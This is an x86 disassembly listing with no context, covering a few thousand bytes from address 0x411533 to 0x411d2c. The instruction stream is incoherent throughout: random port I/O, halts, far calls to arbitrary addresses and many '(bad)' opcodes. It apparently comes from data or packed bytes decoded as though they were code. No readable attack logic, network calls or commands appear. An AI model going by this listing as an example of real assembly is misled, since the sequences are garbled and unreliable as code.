  411533:	into   
  411534:	dec    ebx
  411535:	pop    esi
  411536:	out    0xeb,al
  411538:	or     DWORD PTR [ecx-0x33],0xffffff95
  41153c:	mov    ecx,0x7883aa53
  411541:	int3   
  411542:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411543:	push   0x72
  411545:	in     eax,dx
  411546:	test   BYTE PTR [ecx-0xc],ch
  411549:	repnz rol ebx,1
  41154c:	push   esi
  41154d:	lds    ebp,FWORD PTR [eax+0x7b]
  411550:	pop    ebx
  411551:	jne    0x411530
  411553:	das    
  411554:	sub    dh,BYTE PTR [ebp+0x20]
  411557:	leave  
  411558:	mov    eax,ds:0xffd7f77d
  41155d:	shl    ecx,1
  41155f:	dec    ebx
  411560:	sbb    bl,BYTE PTR [ebp-0xb]
  411563:	cmp    al,0xc8
  411565:	ins    BYTE PTR es:[edi],dx
  411566:	addr16 in eax,0xb0
  411569:	jp     0x41157a
  41156b:	mov    ds,WORD PTR ds:0x38e782bb
  411571:	test   esp,edx
  411573:	pop    ss
  411574:	cs push ss
  411576:	pop    ecx
  411577:	loopne 0x4115d4
  411579:	mov    ds:0x1d7267ec,eax
  41157e:	test   BYTE PTR [edx-0x57],dh
  411581:	push   esp
  411582:	push   ds
  411583:	mov    al,0xae
  411585:	iret   
  411586:	test   BYTE PTR [eax-0x3c1de5e6],ch
  41158c:	pop    ebx
  41158d:	lods   eax,DWORD PTR ds:[esi]
  41158e:	popa   
  41158f:	push   esp
  411590:	jg     0x41156e
  411592:	idiv   DWORD PTR [esp+eax*1+0x4e7fa14e]
  411599:	push   eax
  41159a:	cmp    eax,0x1679fc6c
  41159f:	mov    bl,0x6f
  4115a1:	push   es
  4115a2:	dec    esi
  4115a3:	inc    ebx
  4115a4:	out    0xd9,al
  4115a6:	cmp    dl,BYTE PTR [edx+0x31da3f8e]
  4115ac:	lea    esp,[eax+0x1f]
  4115af:	add    ax,0x548d
  4115b3:	out    dx,eax
  4115b4:	test   DWORD PTR [esi+0x5a],esp
  4115b7:	lea    esp,[ebx-0x7a296fef]
  4115bd:	repz and al,0xce
  4115c0:	lea    ebx,[ecx-0xb75d9e2]
  4115c6:	sub    al,0xe9
  4115c8:	mov    esp,0x6142bcb3
  4115cd:	and    BYTE PTR [eax+0x16],dh
  4115d0:	inc    eax
  4115d1:	cmp    eax,0xe98c1844
  4115d6:	repz xor eax,DWORD PTR [eax]
  4115d9:	dec    ebx
  4115da:	test   BYTE PTR [edx+0x7037118b],ch
  4115e0:	shl    bh,cl
  4115e2:	rol    BYTE PTR [ebp-0xe],cl
  4115e5:	hlt    
  4115e6:	lods   eax,DWORD PTR ds:[esi]
  4115e7:	dec    ebx
  4115e8:	dec    eax
  4115e9:	sub    eax,0xf72bd84d
  4115ee:	adc    eax,0x95babc89
  4115f3:	xor    BYTE PTR [edi+0x3d],0xe0
  4115f7:	mov    ds:0x30e40bdd,al
  4115fc:	push   DWORD PTR [ecx-0x41]
  4115ff:	add    eax,0xf827fcbc
  411604:	es leave 
  411606:	fcomp  QWORD PTR ds:[eax+0x4a1464ec]
  41160d:	(bad)
  411610:	out    0x92,al
  411612:	mov    esp,0x8fc43fef
  411617:	ins    BYTE PTR es:[edi],dx
  411618:	pop    ebp
  411619:	add    DWORD PTR gs:[ecx],esp
  41161c:	xchg   eax,ecx
  41161e:	xlat   BYTE PTR ds:[ebx]
  41161f:	sti    
  411620:	mov    ch,0x9d
  411622:	and    BYTE PTR [ebp-0x2051fd5e],dl
  411628:	lock cmp ebp,DWORD PTR [eax]
  41162b:	xor    al,0xc0
  41162d:	pop    DWORD PTR [edx-0x37]
  411630:	int    0x82
  411632:	mov    ecx,0xb642b6a7
  411637:	gs sbb edx,ebp
  41163a:	xchg   edx,eax
  41163b:	clc    
  41163c:	dec    esp
  41163d:	xor    eax,0x29e41c00
  411642:	(bad)  
  411643:	into   
  411644:	fld    DWORD PTR [esi]
  411646:	adc    DWORD PTR [edx],edi
  411648:	sub    BYTE PTR [ebp-0x5d],bl
  41164b:	loope  0x41161d
  41164d:	scas   al,BYTE PTR es:[edi]
  41164e:	les    eax,FWORD PTR [eax+0x1b]
  411651:	fwait
  411652:	(bad)  
  411653:	ret    
  411654:	xchg   ebx,eax
  411655:	shl    BYTE PTR [edi-0x5a],0xc0
  411659:	and    esi,DWORD PTR [eax]
  41165b:	je     0x411687
  41165d:	cld    
  41165e:	scas   eax,DWORD PTR es:[edi]
  41165f:	cmp    esi,DWORD PTR ds:0xdaf9660d
  411665:	push   esi
  411666:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411667:	push   es
  411668:	adc    dl,dh
  41166a:	repz adc esp,edi
  41166d:	mov    ecx,0x3bc4104f
  411672:	dec    edi
  411673:	sbb    cl,al
  411675:	xchg   esp,eax
  411676:	mov    ecx,DWORD PTR [eax]
  411678:	sbb    ebx,edx
  41167a:	(bad)  
  41167b:	ss jge 0x41164c
  41167e:	hlt    
  41167f:	cli    
  411680:	push   ebp
  411681:	jae    0x41167c
  411683:	stc    
  411684:	mov    al,ds:0xee863036
  411689:	or     al,0x19
  41168b:	sub    DWORD PTR [esi],edi
  41168d:	in     al,0x85
  41168f:	push   eax
  411690:	pop    ds
  411691:	mov    bh,dl
  411693:	ret    0x3d3c
  411696:	and    eax,0x4949d4a8
  41169b:	or     DWORD PTR [ebx+0x3b006bd7],edx
  4116a1:	xor    dh,BYTE PTR [esi+0x73]
  4116a4:	loopne 0x41168c
  4116a6:	mov    ebx,0xbdd71196
  4116ab:	jae    0x4116b7
  4116ad:	icebp  
  4116ae:	jne    0x411693
  4116b0:	mov    ecx,0x68eeb9a8
  4116b5:	fldenv ds:0xb2312362
  4116bb:	jle    0x4116aa
  4116bd:	xchg   edx,eax
  4116be:	ret    0xa39f
  4116c1:	fmul   DWORD PTR [edx]
  4116c3:	inc    eax
  4116c4:	daa    
  4116c5:	cmc    
  4116c6:	ret    
  4116c7:	inc    edi
  4116c8:	pop    edx
  4116c9:	in     al,0xd1
  4116cb:	sar    bh,1
  4116cd:	mov    dl,0x40
  4116cf:	ret    0x4078
  4116d2:	leave  
  4116d3:	sti    
  4116d4:	rcr    DWORD PTR [edi+ebp*8+0x554dd974],cl
  4116db:	repz inc eax
  4116dd:	mov    ds:0xb8f7be68,al
  4116e2:	imul   DWORD PTR [eax]
  4116e4:	pusha  
  4116e5:	mov    DWORD PTR [ebx],edi
  4116e7:	fcomp  DWORD PTR [ecx]
  4116e9:	sub    ah,BYTE PTR [ebx+ecx*1+0x3b]
  4116ed:	(bad)  
  4116ee:	mov    edi,0x165b802d
  4116f3:	es test eax,ecx
  4116f6:	or     BYTE PTR [edx-0x73],cl
  4116f9:	scas   eax,DWORD PTR es:[edi]
  4116fa:	and    DWORD PTR [edi],edx
  4116fc:	push   esp
  4116fd:	pop    edi
  4116fe:	mov    dh,0xa0
  411700:	lods   al,BYTE PTR ds:[esi]
  411701:	jl     0x4116fe
  411703:	mov    ch,0x55
  411705:	pop    esp
  411706:	dec    esp
  411707:	xor    DWORD PTR [eax-0x38539bb2],ecx
  41170d:	add    al,0xf9
  41170f:	paddsw mm2,mm3
  411712:	jmp    0x4116d4
  411714:	dec    ebx
  411715:	lahf   
  411716:	outs   dx,DWORD PTR ds:[esi]
  411717:	mov    ebp,0xb2e786bc
  41171c:	adc    edi,edx
  41171e:	or     ecx,DWORD PTR [edx-0x4778f61e]
  411724:	mov    ebp,0x299163b8
  411729:	push   esp
  41172a:	mov    eax,0x730f4fd7
  41172f:	aad    0x46
  411731:	in     al,dx
  411732:	push   esp
  411733:	jo     0x41176c
  411735:	sub    ebx,0x7f546a05
  41173b:	int3   
  41173c:	sbb    ah,bh
  41173e:	or     BYTE PTR [ecx*8-0x46674b9c],0xd7
  411746:	test   eax,0x8087fe9e
  41174b:	or     bh,BYTE PTR [eax]
  41174d:	or     DWORD PTR [edi-0x2e7b235b],edx
  411753:	repz hlt 
  411755:	mov    DWORD PTR [ecx-0x7a705180],0x3f1e5f3c
  41175f:	fistp  QWORD PTR [edi]
  411761:	add    DWORD PTR [eax],0xf33d28a7
  411767:	mov    ds:0xbb27a05e,al
  41176c:	push   ebp
  41176d:	rcl    DWORD PTR [ebx+0x1a],1
  411770:	push   ds
  411771:	mov    al,ds:0x72c9ab15
  411776:	mov    bl,0x70
  411778:	imul   ebx,DWORD PTR [eax-0x3a506cb],0xb2bb998c
  411782:	ret    
  411783:	test   DWORD PTR ds:[ebp-0x5ec3c352],ebx
  41178a:	inc    ebx
  41178b:	lahf   
  41178c:	push   ebp
  41178d:	ins    DWORD PTR es:[edi],dx
  41178e:	loopne 0x41179f
  411790:	dec    eax
  411791:	sahf   
  411792:	test   al,0xb3
  411794:	sub    al,BYTE PTR [ebx]
  411796:	xchg   bx,ax
  411798:	mov    edx,0x38fdc733
  41179d:	lods   al,BYTE PTR ds:[esi]
  41179e:	adc    ebp,0x50b200a6
  4117a4:	out    dx,eax
  4117a5:	pop    esi
  4117a6:	fmul   QWORD PTR [eax-0xde0fc17]
  4117ac:	sub    dl,BYTE PTR [edi+eiz*4]
  4117af:	add    BYTE PTR [esi-0x6c],dl
  4117b2:	inc    ecx
  4117b3:	sub    edx,DWORD PTR [edx]
  4117b5:	mov    bh,0x10
  4117b8:	popf   
  4117b9:	xor    esp,DWORD PTR [ebx]
  4117bb:	(bad)  
  4117bc:	out    0xd5,eax
  4117be:	sub    al,0xa2
  4117c0:	fcmovnbe st,st(7)
  4117c2:	call   0xb1790f69
  4117c7:	mov    ds:0x9ff03b5c,eax
  4117cc:	inc    ecx
  4117cd:	scas   al,BYTE PTR es:[edi]
  4117ce:	xchg   ebx,eax
  4117cf:	xchg   ebp,eax
  4117d0:	ret    0xbcd
  4117d3:	dec    edx
  4117d4:	dec    ebx
  4117d5:	inc    ebx
  4117d6:	pop    ds
  4117d7:	mov    eax,0x6df6654c
  4117dc:	lods   al,BYTE PTR ds:[esi]
  4117dd:	xlat   BYTE PTR ds:[ebx]
  4117de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4117df:	ins    BYTE PTR es:[edi],dx
  4117e0:	add    BYTE PTR [eax],bl
  4117e2:	cmp    eax,0x265aa1d5
  4117e7:	mov    ebx,0x52dd0849
  4117ec:	(bad)  
  4117ed:	pop    ds
  4117ee:	fcmovnbe st,st(6)
  4117f0:	cmp    eax,0x5f604f3e
  4117f5:	cwde   
  4117f6:	sub    ah,0xaa
  4117f9:	mov    al,ds:0x66de8279
  4117fe:	mov    cl,0xaa
  411800:	and    DWORD PTR es:[ebx],ebx
  411803:	test   eax,0x2a994596
  411808:	push   eax
  411809:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41180a:	or     DWORD PTR [edx],ecx
  41180c:	sbb    BYTE PTR [edx-0xb3bdfd9],0x57
  411813:	mov    ?,WORD PTR [eax+ebp*8]
  411816:	aaa    
  411817:	dec    ebx
  411818:	aaa    
  411819:	mov    eax,0xfc476dd9
  41181e:	push   0x50
  411820:	xor    al,ah
  411822:	les    esi,FWORD PTR [ebp-0x62]
  411825:	neg    al
  411827:	mov    BYTE PTR [ecx+0x47083efb],dl
  41182d:	cmp    eax,DWORD PTR [ecx+0x61]
  411830:	ds inc edx
  411832:	or     ah,BYTE PTR [esp+ebp*1+0xf]
  411836:	sub    DWORD PTR [ecx-0x59f003e7],eax
  41183c:	lock cmp ecx,DWORD PTR [esi]
  41183f:	push   cs
  411840:	jg     0x411853
  411842:	mov    ebx,0xfa91335c
  411847:	push   edx
  411848:	cdq    
  411849:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41184a:	mov    edi,0x4783c911
  41184f:	xchg   ebp,eax
  411850:	leave  
  411851:	jno    0x411895
  411853:	aad    0x9
  411855:	loop   0x411867
  411857:	in     eax,dx
  411858:	sahf   
  411859:	popf   
  41185a:	js     0x411829
  41185c:	loopne 0x411878
  41185e:	pop    esp
  41185f:	dec    edx
  411860:	daa    
  411861:	add    BYTE PTR [ebx],al
  411863:	movaps xmm3,XMMWORD PTR [eax]
  411866:	test   cl,ah
  411868:	inc    ecx
  411869:	xchg   ebp,eax
  41186a:	loopne 0x41184c
  41186c:	aas    
  41186d:	push   ebx
  41186e:	adc    bl,cl
  411870:	fwait
  411871:	pop    esp
  411872:	cmp    esp,DWORD PTR ds:0x16339a6c
  411878:	lahf   
  411879:	sbb    eax,0xfc77c16b
  41187e:	inc    esp
  41187f:	loope  0x41186e
  411881:	leave  
  411882:	out    dx,eax
  411883:	or     esp,esp
  411885:	test   DWORD PTR [edx+eiz*1+0x7bfa3d0d],0xd92a15da
  411890:	dec    ebx
  411891:	jecxz  0x4118d1
  411893:	sub    ch,dh
  411895:	lods   eax,DWORD PTR fs:[esi]
  411897:	out    dx,al
  411898:	jle    0x4118d2
  41189a:	aaa    
  41189b:	push   eax
  41189c:	in     eax,0xf4
  41189e:	daa    
  41189f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4118a0:	xor    eax,0xa450beb7
  4118a5:	dec    edi
  4118a6:	xor    ah,BYTE PTR [edx-0x2126c0bc]
  4118ac:	xchg   DWORD PTR [eax],edi
  4118ae:	bound  edx,QWORD PTR [ebp-0x157dd4]
  4118b4:	mov    ds:0xb22bae29,eax
  4118b9:	mov    bh,0xdf
  4118bb:	xchg   ebp,eax
  4118bc:	adc    BYTE PTR [esi-0x72],al
  4118bf:	push   0xffffffd7
  4118c1:	cli    
  4118c2:	shl    BYTE PTR [esi],1
  4118c4:	lock sub eax,0xcda72800
  4118ca:	push   eax
  4118cb:	adc    DWORD PTR [ebp+eax*2+0x1248b6b],0x63
  4118d3:	int3   
  4118d4:	test   eax,0xfd979375
  4118d9:	and    eax,0xbfcd6a95
  4118de:	sub    eax,0xa716970a
  4118e3:	getsec 
  4118e5:	ret    0xe802
  4118e8:	neg    BYTE PTR [esp+edi*1]
  4118eb:	pop    esi
  4118ec:	cmp    ch,BYTE PTR [ebx+0x5a35d30e]
  4118f2:	xchg   esp,eax
  4118f3:	rcl    cl,0xa2
  4118f6:	mov    dl,dh
  4118f8:	mov    ds:0xd558c2bf,al
  4118fd:	mov    dl,0xcf
  4118ff:	xor    al,0x44
  411901:	out    dx,eax
  411902:	add    DWORD PTR [edx+esi*8+0xda0faea],esp
  411909:	push   ebx
  41190a:	xor    edi,edi
  41190c:	test   al,0xb9
  41190e:	rcl    eax,0xf7
  411911:	and    BYTE PTR [esi-0x6691640c],0x61
  411918:	data16 mov al,0xd9
  41191b:	push   esi
  41191c:	popf   
  41191d:	jg     0x41195f
  41191f:	xchg   ebx,eax
  411920:	add    DWORD PTR ds:[esi+0x2caa4c87],esi
  411927:	push   esp
  411928:	retf   0xf12f
  41192b:	jl     0x4118e8
  41192d:	test   eax,0x9451fc35
  411932:	jbe    0x4118ec
  411934:	outs   dx,DWORD PTR ds:[esi]
  411935:	shl    ecx,0xa2
  411938:	cmp    BYTE PTR [eax+0xc5a437b],cl
  41193e:	ror    DWORD PTR [eax+esi*4-0x36],1
  411942:	sbb    DWORD PTR [edi],ebp
  411944:	xor    al,0xd7
  411946:	cmc    
  411947:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411948:	xor    BYTE PTR [ebp+0x3e],dl
  41194b:	sbb    eax,0x4afd938
  411950:	or     edi,DWORD PTR [esi-0x31]
  411953:	pop    edx
  411954:	test   al,0xc7
  411956:	les    edi,FWORD PTR [eax-0xc]
  411959:	inc    esi
  41195a:	repz imul esp,DWORD PTR [ebx+esi*2],0x9a908bfd
  411962:	xor    DWORD PTR [ebp+0x48],eax
  411965:	es shl ah,0x7
  411969:	mov    edi,0xa425958f
  41196e:	retf   0x5bd5
  411971:	mov    ah,0x9e
  411973:	push   ebp
  411974:	cld    
  411975:	loop   0x41190e
  411977:	(bad)
  41197b:	loop   0x41193a
  41197d:	in     eax,0x71
  41197f:	mov    ecx,0x6e51bfe9
  411984:	imul   esi,DWORD PTR [edx-0x3a],0x2c
  411988:	lahf   
  411989:	cmp    BYTE PTR [ebx+0x7f62a6cf],dl
  41198f:	add    edi,DWORD PTR [eax-0x6253d89c]
  411995:	jl     0x411999
  411997:	inc    ebx
  411998:	adc    DWORD PTR [edx+eax*1+0x2],esi
  41199c:	imul   ebx,DWORD PTR [ebx+0x490c6ff3],0xebf7d271
  4119a6:	and    BYTE PTR [ecx],dl
  4119a8:	push   esp
  4119a9:	dec    ecx
  4119aa:	add    ebx,eax
  4119ac:	test   eax,ebp
  4119ae:	jne    0x4119db
  4119b0:	add    eax,0x539c2d71
  4119b5:	cdq    
  4119b6:	or     BYTE PTR ds:0x342f1f15,ah
  4119bc:	mov    BYTE PTR ds:0x17ead9a1,cl
  4119c2:	call   0x7020:0x37252ccc
  4119c9:	stc    
  4119ca:	mov    ch,0x4a
  4119cc:	ins    BYTE PTR es:[edi],dx
  4119cd:	push   0xa163ea30
  4119d2:	ds xchg edx,eax
  4119d4:	pop    eax
  4119d5:	mov    ebx,0x20be2312
  4119da:	jo     0x41198f
  4119dc:	clc    
  4119dd:	sub    eax,DWORD PTR [esi-0x4f]
  4119e0:	call   0xfac1cf89
  4119e5:	xchg   DWORD PTR ds:0xc874be9b,ebx
  4119eb:	or     ebx,DWORD PTR [edx-0x67]
  4119ee:	mov    dh,0xc5
  4119f0:	cmp    al,0x40
  4119f2:	fs inc esi
  4119f4:	pop    esp
  4119f5:	mov    esp,0xa5cbb194
  4119fa:	and    ch,BYTE PTR [esi+0x2597a7af]
  411a00:	sbb    DWORD PTR ds:[ebx+0x5fdbaf1a],0xffffffb1
  411a08:	push   edi
  411a09:	push   ss
  411a0a:	jb     0x411a24
  411a0c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411a0d:	inc    ebp
  411a0e:	push   esp
  411a0f:	sub    edi,DWORD PTR [ebp-0x37656d44]
  411a15:	mov    esi,0x87e6c469
  411a1a:	xchg   esi,eax
  411a1b:	ds (bad) 
  411a1d:	(bad)  
  411a1e:	inc    BYTE PTR [ebx+0xd]
  411a21:	or     al,0xf5
  411a23:	aaa    
  411a24:	seta   al
  411a27:	test   al,0x71
  411a29:	xchg   ebx,eax
  411a2a:	sub    DWORD PTR [ecx+0x283fa9ea],ebp
  411a30:	push   ss
  411a31:	(bad)  
  411a32:	mov    al,0xa
  411a34:	cli    
  411a35:	imul   ecx,DWORD PTR [ebx],0xf20c9ac8
  411a3b:	jns    0x411aa9
  411a3d:	lods   al,BYTE PTR ds:[esi]
  411a3e:	imul   esi,DWORD PTR [esi+0x3078c7d],0xca4cfe28
  411a48:	xor    bh,cl
  411a4a:	pop    ss
  411a4b:	xchg   DWORD PTR ds:0xe04d8993,ecx
  411a51:	jb     0x411a5c
  411a53:	test   DWORD PTR [ebx-0x421bb6b3],ebx
  411a59:	and    DWORD PTR [ecx],0xf3f2f390
  411a5f:	iret   
  411a60:	pop    esp
  411a61:	jmp    0xa289cffc
  411a66:	lods   eax,DWORD PTR ds:[esi]
  411a67:	jbe    0x411a5d
  411a69:	test   eax,0xc47e862
  411a6e:	mov    DWORD PTR [ebp-0x246a0b55],ecx
  411a74:	ds cmp eax,0x3237ecce
  411a7a:	dec    ecx
  411a7b:	aaa    
  411a7c:	not    BYTE PTR [ebx+eax*2]
  411a7f:	sub    al,0x6f
  411a81:	or     eax,0xce12aa7a
  411a86:	in     eax,0x3c
  411a88:	mov    edx,0xeda8c808
  411a8d:	enter  0x96ad,0x65
  411a91:	cmp    DWORD PTR [edx],0xa4d8c90a
  411a97:	pop    esp
  411a98:	shl    BYTE PTR [ebx-0x7d6ff0c7],cl
  411a9e:	mov    ds:0xe5476ddf,eax
  411aa3:	dec    ecx
  411aa4:	jg     0x411a32
  411aa6:	ret    0x1e05
  411aa9:	xor    BYTE PTR [edx],al
  411aab:	std    
  411aac:	shr    ch,cl
  411aae:	pop    ebx
  411aaf:	div    DWORD PTR [esi-0x60]
  411ab2:	jo     0x411abc
  411ab4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411ab5:	mov    bl,0x12
  411ab7:	cs sbb al,al
  411aba:	xor    BYTE PTR [esi+edx*4],ch
  411abd:	scas   eax,DWORD PTR es:[edi]
  411abe:	pop    eax
  411abf:	je     0x411b2b
  411ac1:	int    0x67
  411ac3:	aas    
  411ac4:	out    0x9e,eax
  411ac6:	fwait
  411ac7:	daa    
  411ac8:	dec    eax
  411ac9:	call   0xb36787d4
  411ace:	test   eax,0xb245df68
  411ad3:	mov    dh,ah
  411ad5:	lock dec eax
  411ad7:	push   0xb5ddf947
  411adc:	shr    esp,cl
  411ade:	dec    esp
  411adf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411ae0:	and    al,0xeb
  411ae2:	or     BYTE PTR [edx],0x4c
  411ae5:	ret    
  411ae6:	push   es
  411ae7:	(bad)  
  411ae8:	mov    edi,0x12713f88
  411aed:	outs   dx,BYTE PTR ds:[esi]
  411aee:	sbb    ch,dh
  411af0:	(bad)  
  411af2:	pop    ss
  411af3:	retf   
  411af4:	cmp    DWORD PTR [edx],0xffffffb2
  411af7:	xor    esi,DWORD PTR [edx]
  411af9:	push   ebx
  411afa:	lods   eax,DWORD PTR ds:[esi]
  411afb:	mov    edi,0x30050055
  411b00:	cmp    al,0x1a
  411b02:	mov    edi,0xbfc9c6ca
  411b07:	in     eax,0x4c
  411b09:	scas   eax,DWORD PTR es:[edi]
  411b0a:	xchg   ecx,eax
  411b0b:	or     eax,0xb6f76e8b
  411b10:	cmp    al,BYTE PTR [ebp+0x76]
  411b13:	mov    ds:0x10fbb60f,eax
  411b18:	bound  edi,QWORD PTR [eax+edi*4]
  411b1b:	sti    
  411b1c:	aam    0x7a
  411b1e:	pusha  
  411b1f:	or     DWORD PTR [ecx],edi
  411b21:	daa    
  411b22:	rcl    DWORD PTR ds:0x31626530,0x30
  411b29:	push   ds
  411b2a:	fs mov ebx,0x8dde284
  411b30:	or     DWORD PTR [eax-0x5e],eax
  411b33:	shr    DWORD PTR [esi-0x4f],cl
  411b36:	lods   al,BYTE PTR ds:[esi]
  411b37:	test   BYTE PTR [ecx],al
  411b39:	ss mov bh,0x8a
  411b3c:	adc    cl,BYTE PTR [edi+0x16]
  411b3f:	and    BYTE PTR [esi-0x3a],dl
  411b42:	pop    ss
  411b43:	push   edi
  411b44:	pcmpeqb mm5,QWORD PTR [ecx-0x1a2fdbb9]
  411b4b:	adc    cl,ah
  411b4d:	outs   dx,DWORD PTR ds:[esi]
  411b4e:	das    
  411b4f:	mov    dh,0xf8
  411b51:	mov    ah,0x16
  411b53:	mov    edi,0x2c8fef6f
  411b58:	aaa    
  411b59:	inc    esi
  411b5a:	retf   0xb08f
  411b5d:	gs ret 
  411b5f:	push   ss
  411b60:	outs   dx,BYTE PTR ds:[esi]
  411b61:	jb     0x411b60
  411b63:	xchg   ebp,eax
  411b64:	sbb    DWORD PTR [eax+0x2e],eax
  411b67:	pusha  
  411b68:	mov    dl,0xda
  411b6a:	(bad)  
  411b6c:	in     al,0x46
  411b6e:	mov    al,ds:0x85c5f3aa
  411b73:	lods   eax,DWORD PTR ds:[esi]
  411b74:	adc    esi,ecx
  411b76:	add    esp,0x4a1e5559
  411b7c:	inc    edx
  411b7d:	pop    ds
  411b7e:	fsubr  st,st(3)
  411b80:	adc    ebx,ebx
  411b82:	cmp    esp,edx
  411b84:	cmp    dl,cl
  411b86:	xchg   ecx,eax
  411b87:	or     bl,BYTE PTR [esi-0x272d1102]
  411b8d:	add    esi,ebp
  411b8f:	pop    eax
  411b90:	jns    0x411bdf
  411b92:	xor    DWORD PTR [edi+0x7213635f],edi
  411b98:	sub    BYTE PTR [edx],0x18
  411b9b:	loope  0x411b46
  411b9d:	xor    esp,DWORD PTR [ebx]
  411b9f:	mov    dh,0xbc
  411ba1:	scas   eax,DWORD PTR es:[edi]
  411ba2:	xchg   ebx,eax
  411ba3:	cwde   
  411ba4:	xchg   edx,eax
  411ba5:	fdiv   DWORD PTR [ebx]
  411ba7:	aaa    
  411ba8:	or     dl,BYTE PTR [edx-0x4ecd3a58]
  411bae:	push   cs
  411baf:	fisubr WORD PTR [edx-0x70a2821d]
  411bb5:	and    eax,0xa70413a3
  411bba:	aas    
  411bbb:	jge    0x411b91
  411bbd:	pop    eax
  411bbe:	add    al,0x9f
  411bc0:	cld    
  411bc1:	adc    cl,ah
  411bc3:	cmp    BYTE PTR [edi+edi*1-0x52],dl
  411bc7:	int    0x7d
  411bc9:	shr    DWORD PTR [edx],0x24
  411bcc:	dec    ecx
  411bcd:	fbstp  TBYTE PTR [edi+0x14]
  411bd0:	dec    ebp
  411bd1:	js     0x411c23
  411bd3:	xor    DWORD PTR [ecx+0x66],edx
  411bd6:	(bad)  
  411bd9:	clc    
  411bda:	mov    ebp,0xdba61866
  411bdf:	add    BYTE PTR [edx-0x56],0x19
  411be3:	mov    eax,0xa34e49d6
  411be8:	mov    ds:0x68499bcc,al
  411bed:	inc    edx
  411bee:	mov    cl,bh
  411bf0:	test   eax,0xcb0a29f3
  411bf5:	inc    edi
  411bf6:	inc    ebp
  411bf7:	or     ebx,DWORD PTR [edi+0x416aba7d]
  411bfd:	pop    ds
  411bfe:	popa   
  411bff:	out    dx,eax
  411c00:	fwait
  411c01:	(bad)  
  411c03:	call   0xbb475e5a
  411c08:	fsubrp st(3),st
  411c0a:	shl    ch,1
  411c0c:	jl     0x411c8c
  411c0e:	push   ebx
  411c0f:	out    dx,al
  411c10:	std    
  411c11:	je     0x411c0f
  411c13:	das    
  411c14:	pop    ss
  411c15:	pop    ebx
  411c16:	imul   ebx,DWORD PTR [ecx-0x30],0x6194144d
  411c1d:	lea    ecx,[ecx+0x69]
  411c20:	push   ebx
  411c21:	or     al,0xef
  411c23:	cmp    DWORD PTR [edi+0x55],edi
  411c26:	popf   
  411c27:	repnz hlt 
  411c29:	pop    esi
  411c2a:	push   ebx
  411c2b:	int3   
  411c2c:	jns    0x411c41
  411c2e:	ss out dx,al
  411c30:	mov    al,ds:0xd930acf0
  411c35:	fadd   DWORD PTR [esi-0x58]
  411c38:	in     al,dx
  411c39:	inc    ebx
  411c3a:	adc    BYTE PTR [esp+ebx*4],ah
  411c3d:	(bad)  
  411c3e:	cli    
  411c3f:	in     al,dx
  411c40:	imul   ecx,DWORD PTR fs:[ebx+0x5e26bd0],0xba493baf
  411c4b:	mov    ebx,ebp
  411c4d:	pushf  
  411c4e:	jge    0x411c3a
  411c50:	out    dx,eax
  411c51:	and    al,0x89
  411c53:	cdq    
  411c54:	loope  0x411c82
  411c56:	push   edi
  411c57:	mov    WORD PTR [ebx+0x3bc2b62],fs
  411c5d:	lock (bad) 
  411c5f:	data16 sub BYTE PTR [edx],dh
  411c62:	retf   
  411c63:	call   0x23ba:0xd96f486d
  411c6a:	dec    dl
  411c6c:	and    edi,DWORD PTR [ecx]
  411c6e:	call   0xcef8:0x4c0ae44d
  411c75:	imul   edi,DWORD PTR [edi+eiz*1],0x7826bbd6
  411c7c:	mov    al,0x3f
  411c7e:	outs   dx,BYTE PTR ds:[esi]
  411c7f:	mov    ah,0x94
  411c81:	je     0x411d02
  411c83:	mov    al,ds:0xb94a498d
  411c88:	in     eax,dx
  411c89:	ins    DWORD PTR es:[edi],dx
  411c8a:	or     DWORD PTR [edi+eax*2+0x3ed513a5],eax
  411c91:	test   eax,0x9fdf8b9
  411c96:	(bad)  
  411c97:	or     DWORD PTR [ecx],esp
  411c99:	inc    ebp
  411c9a:	mov    bh,0x5a
  411c9c:	loope  0x411c5c
  411c9e:	add    al,BYTE PTR [ebx+0x4]
  411ca1:	dec    edi
  411ca2:	and    DWORD PTR [ebp-0x272609b3],esi
  411ca8:	xchg   edx,eax
  411ca9:	adc    DWORD PTR [eax-0x9],eax
  411cac:	cmp    eax,0x9d12b1b
  411cb1:	imul   esi,DWORD PTR [esi],0xffffffbe
  411cb4:	nop
  411cb5:	xor    al,0x9f
  411cb7:	xchg   ebp,eax
  411cb8:	mov    cl,0x64
  411cba:	sbb    al,0xd7
  411cbc:	inc    esi
  411cbd:	mov    dl,BYTE PTR [ebp-0x76]
  411cc0:	sub    dl,BYTE PTR [edi]
  411cc2:	sti    
  411cc3:	cmp    al,0xca
  411cc5:	sbb    eax,0x7a937874
  411cca:	(bad)  
  411ccc:	inc    eax
  411ccd:	shr    BYTE PTR [ebx],cl
  411ccf:	out    0x20,al
  411cd1:	scas   al,BYTE PTR es:[edi]
  411cd2:	mov    cl,bl
  411cd4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411cd5:	sub    eax,0xe4fdbbf2
  411cda:	pop    esp
  411cdb:	imul   edi,DWORD PTR [ebx-0x374bc0b],0x71
  411ce2:	mov    al,ds:0x729bf253
  411ce7:	xchg   esp,eax
  411ce8:	fist   WORD PTR ds:0x4cd5
  411ced:	and    BYTE PTR [esi-0x7fc2ccad],0x53
  411cf4:	in     al,dx
  411cf5:	(bad)  
  411cf6:	xchg   edx,eax
  411cf7:	cmp    BYTE PTR [ebx-0x43],ch
  411cfa:	(bad)  
  411cfb:	in     eax,0xd4
  411cfd:	call   0xc989:0xbb1ad4c9
  411d04:	outs   dx,DWORD PTR ds:[esi]
  411d05:	lods   al,BYTE PTR ds:[esi]
  411d06:	ret    
  411d07:	mov    edi,0x514cebb
  411d0c:	(bad)  
  411d0d:	xor    ah,BYTE PTR [ecx-0x6b474623]
  411d13:	repz pop eax
  411d15:	jne    0x411d21
  411d17:	xor    al,0x8b
  411d19:	mov    al,ds:0x6cee2701
  411d1e:	pop    ss
  411d1f:	rcl    DWORD PTR [eax+0x3d],1
  411d22:	mov    ds:0xaa5d39d6,al
  411d27:	mov    eax,0x4075306
  411d2c:	clc    
